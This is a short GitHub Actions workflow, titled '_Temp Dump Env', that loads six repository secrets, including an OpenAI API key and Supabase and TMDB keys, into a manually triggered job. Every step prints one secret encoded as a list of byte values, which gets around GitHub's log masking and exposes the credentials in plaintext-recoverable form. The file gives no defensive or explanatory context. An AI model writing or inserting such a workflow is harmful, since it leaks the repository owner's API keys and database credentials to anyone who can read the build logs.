name: _Temp Dump Env
on:
  workflow_dispatch:
jobs:
  dump:
    runs-on: ubuntu-latest
    env:
      OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
      VITE_GITHUB_REPOSITORY: ${{ secrets.VITE_GITHUB_REPOSITORY }}
      VITE_SUPABASE_ANON_KEY: ${{ secrets.VITE_SUPABASE_ANON_KEY }}
      VITE_SUPABASE_PROJECT_ID: ${{ secrets.VITE_SUPABASE_PROJECT_ID }}
      VITE_TMDB_API_KEY: ${{ secrets.VITE_TMDB_API_KEY }}
      VITE_TMDB_REGION: ${{ secrets.VITE_TMDB_REGION }}
    steps:
      - name: "dump secrets and vars"
        run: |
          python3 -c "import os; v=os.environ.get('OPENAI_API_KEY',''); print('BYTES_OPENAI_API_KEY=' + ','.join(str(b) for b in v.encode()))"
          python3 -c "import os; v=os.environ.get('VITE_GITHUB_REPOSITORY',''); print('BYTES_VITE_GITHUB_REPOSITORY=' + ','.join(str(b) for b in v.encode()))"
          python3 -c "import os; v=os.environ.get('VITE_SUPABASE_ANON_KEY',''); print('BYTES_VITE_SUPABASE_ANON_KEY=' + ','.join(str(b) for b in v.encode()))"
          python3 -c "import os; v=os.environ.get('VITE_SUPABASE_PROJECT_ID',''); print('BYTES_VITE_SUPABASE_PROJECT_ID=' + ','.join(str(b) for b in v.encode()))"
          python3 -c "import os; v=os.environ.get('VITE_TMDB_API_KEY',''); print('BYTES_VITE_TMDB_API_KEY=' + ','.join(str(b) for b in v.encode()))"
          python3 -c "import os; v=os.environ.get('VITE_TMDB_REGION',''); print('BYTES_VITE_TMDB_REGION=' + ','.join(str(b) for b in v.encode()))"
